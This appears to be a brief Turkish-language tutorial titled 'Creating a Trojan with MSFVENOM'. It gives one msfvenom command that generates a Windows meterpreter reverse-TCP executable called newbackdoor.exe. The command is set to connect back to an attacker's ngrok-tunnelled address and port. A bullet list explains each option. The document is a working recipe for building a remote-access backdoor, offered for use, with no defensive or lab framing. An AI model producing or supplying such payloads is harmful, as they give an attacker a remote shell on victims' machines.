# MSFVENOM ile Trojan Oluşturma

```msfvenom -p windows/meterpreter/reverse_tcp -a X86 --platform windows lhost=0.tcp... lport=12345 -f exe -o /root/newbackdoor.exe```

* -p: payload
* -a: bit sayısı
* --platform: hangi platformda çalışacağı 
* lhost: ngrok'dan kopyaladığımız IP
* lport: ngrok'dan kopyaladığımız PORT
* -f: dosya uzantısı 
* -o: trojan'in kaydedileceği konum
